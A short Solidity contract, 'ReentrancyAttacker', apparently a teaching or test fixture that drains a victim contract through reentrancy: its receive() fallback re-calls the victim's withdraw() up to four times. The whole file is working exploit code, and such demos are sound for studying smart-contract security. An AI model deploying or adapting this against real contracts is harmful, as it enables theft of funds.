//SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract ReentrancyAttacker {
    address public victim;
    uint256 public amount;
    uint256 public counter;

    constructor(address _victim) payable {
        victim = _victim;
        amount = msg.value;
    }

    receive() external payable {
        counter++;
        withdrawAttack();
    }

    function payIn() public returns (bool success) {
        (success, ) = payable(victim).call{value: amount}(abi.encodeWithSignature("payIn()"));
    }

    function addAmount() public payable {
        amount += msg.value;
    }

    function withdrawAttack() public {
        if (counter < 4) {
            payable(victim).call(abi.encodeWithSignature("withdraw()"));
        }
    }

    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
